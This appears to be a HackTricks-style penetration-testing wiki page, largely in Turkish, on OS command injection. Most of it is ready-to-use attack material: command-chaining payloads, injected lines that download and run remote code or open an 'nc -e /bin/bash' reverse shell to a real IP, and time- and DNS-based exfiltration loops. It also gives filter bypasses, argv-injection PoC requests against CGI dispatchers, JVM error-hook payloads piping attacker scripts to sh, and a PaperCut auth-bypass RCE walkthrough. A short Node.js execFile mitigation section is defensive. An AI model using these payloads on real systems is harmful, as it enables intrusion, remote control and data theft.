# Command Injection

{{#include ../banners/hacktricks-training.md}}

## command Injection nedir?

A **command injection** bir uygulamayı barındıran sunucuda saldırganın rastgele işletim sistemi komutları çalıştırmasına izin verir. Sonuç olarak, uygulama ve tüm verileri tamamen ele geçirilebilir. Bu komutların çalıştırılması genellikle saldırganın uygulamanın ortamına ve alttaki sistem üzerinde yetkisiz erişim veya kontrol sağlamasına olanak tanır.

### Bağlam

Girdinizin **nereye enjekte edildiğine** bağlı olarak, komutlardan önce **alıntılı bağlamı sonlandırmanız** ( `"` veya `'` kullanarak) gerekebilir.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Limition** Bypasses

Eğer bir linux makinesinde **keyfi komutlar** çalıştırmaya çalışıyorsanız, bu **Bypasses:** hakkında okumak ilginizi çekecektir.


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Örnekler**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Parametreler

Code injection ve benzer RCE zafiyetlerine karşı savunmasız olabilecek en iyi 25 parametre şunlardır (kaynak: [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

Veri çıkarma: char by char
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

`https://github.com/HoLyVieR/dnsbin` kaynağındaki araca dayanır; ayrıca dnsbin.zhack.ca'da barındırılmaktadır.
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
DNS tabanlı data exfiltration'ı kontrol etmek için çevrimiçi araçlar:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

JavaScript/TypeScript arka uçlarını denetlerken sıklıkla Node.js `child_process` API'si ile karşılaşırsınız.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` bir **shell** (`/bin/sh -c`) başlatır, bu nedenle shell için özel anlamı olan herhangi bir karakter (back-ticks, `;`, `&&`, `|`, `$()`, …) kullanıcı girişi string içinde birleştirildiğinde **command injection** ile sonuçlanır.

**Önlem:** `execFile()` kullanın (veya `spawn()`'ı `shell` seçeneği olmadan) ve **her argümanı ayrı bir dizi öğesi olarak** sağlayın, böylece shell kullanılmaz:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 was exploitable through an unauthenticated WebSocket event that placed attacker controlled data into `id_user` which was later embedded in an `exec()` call, achieving RCE (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

Not all injections require shell metacharacters. If the application passes untrusted strings as arguments to a system utility (even with `execve`/`execFile` and no shell), many programs will still parse any argument that begins with `-` or `--` as an option. This lets an attacker flip modes, change output paths, or trigger dangerous behaviors without ever breaking into a shell.

Bunun görüldüğü tipik yerler:

- Gömülü web arayüzleri/CGI handler'ları که `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>` gibi komutlar oluşturuyor.
- Merkezi CGI yönlendiricileri (ör. `/cgi-bin/<something>.cgi` içinde `topicurl=<handler>` gibi bir selector parametresi olan) — birden fazla handler aynı zayıf doğrulayıcıyı tekrar kullandığında.

Ne denemeli:

- Aşağı akıştaki araç tarafından bayrak olarak tüketilecek `-`/`--` ile başlayan değerler sağlayın.
- Davranışı değiştiren veya dosya yazan bayrakları kötüye kullanın, örneğin:
  - `ping`: `-f`/`-c 100000` ile cihazı zorlamak (DoS)
  - `curl`: `-o /tmp/x` ile rastgele dosya yollarına yazma, `-K <url>` ile saldırgan kontrollü konfigürasyonu yükleme
  - `tcpdump`: `-G 1 -W 1 -z /path/script.sh` ile rotate sonrası yürütmeyi (post-rotate execution) güvensiz wrapper'larda sağlama
- Program `--` end-of-options'ı destekliyorsa, yanlış yere `--` ekleyen naif mitigasyonları atlatmayı deneyin.

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
### Garantili exec için JVM tanılama callback'leri

Uygulama bytecode'una dokunmadan güvenilir bir RCE'ye dönüştürülebilen, **JVM komut satırı argümanlarını enjekte etmenize** izin veren herhangi bir primitive (`_JAVA_OPTIONS`, launcher config files, `AdditionalJavaArguments` fields in desktop agents, etc.):

1. **Deterministik bir çökme zorlayın**: metaspace veya heap'i küçültün: `-XX:MaxMetaspaceSize=16m` (veya küçük bir `-Xmx`). Bu, erken bootstrap sırasında bile bir `OutOfMemoryError` garanti eder.
2. **Bir error hook ekleyin**: `-XX:OnOutOfMemoryError="<cmd>"` veya `-XX:OnError="<cmd>"` JVM abort ettiğinde herhangi bir OS komutunu çalıştırır.
3. İsteğe bağlı olarak kurtarma girişimlerini önlemek ve payload'u tek seferlik tutmak için `-XX:+CrashOnOutOfMemoryError` ekleyin.

Örnek payloads:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
```
Because these diagnostics are parsed by the JVM itself, no shell metacharacters are required and the command runs with the same integrity level as the launcher. Desktop IPC bugs that forward user-supplied JVM flags (see [Localhost WebSocket abuse](websocket-attacks.md#localhost-websocket-abuse--browser-port-discovery)) therefore translate directly into OS command execution.

## PaperCut NG/MF SetupCompleted auth bypass -> print scripting RCE

- Etkilenen NG/MF build'leri (ör., 22.0.5 Build 63914) `/app?service=page/SetupCompleted` yolunu açığa çıkarır; oraya gidip **Login**e tıkladığınızda kimlik bilgisi olmadan geçerli bir `JSESSIONID` döner (setup akışında authentication bypass).
- **Options → Config Editor** içinde `print-and-device.script.enabled=Y` ve `print.script.sandboxed=N` ayarlarını yaparak printer scripting'i açın ve sandbox'ı devre dışı bırakın.
- Yazıcı **Scripting** sekmesinde script'i etkinleştirin ve doğrulama hatalarını önlemek için `printJobHook`'u tanımlı bırakın; fakat payload'u fonksiyonun **dışına** yerleştirin, böylece **Apply**'e tıkladığınızda hemen çalışır (yazdırma işi gerekmez):
```js
function printJobHook(inputs, actions) {}
cmd = ["bash","-c","curl http://attacker/hit"];
java.lang.Runtime.getRuntime().exec(cmd);
```
- Callback'ı reverse shell ile değiştirin; UI/PoC pipes/redirects işleyemiyorsa, tek komutla bir payload hazırlayıp ikinci istekle exec edin.
- Horizon3'ün [CVE-2023-27350.py](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py) auth bypass, config flips, command execution ve rollback'i otomatikleştirir—hizmet yalnızca içeriden erişilebiliyorsa upstream proxy (ör. `proxychains` → Squid) üzerinden çalıştırın.

## Brute-Force Tespit Listesi


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}


## Referanslar

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)
- [PaperCut NG/MF SetupCompleted auth bypass → print scripting RCE](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [CVE-2023-27350.py (auth bypass + print scripting automation)](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py)

{{#include ../banners/hacktricks-training.md}}
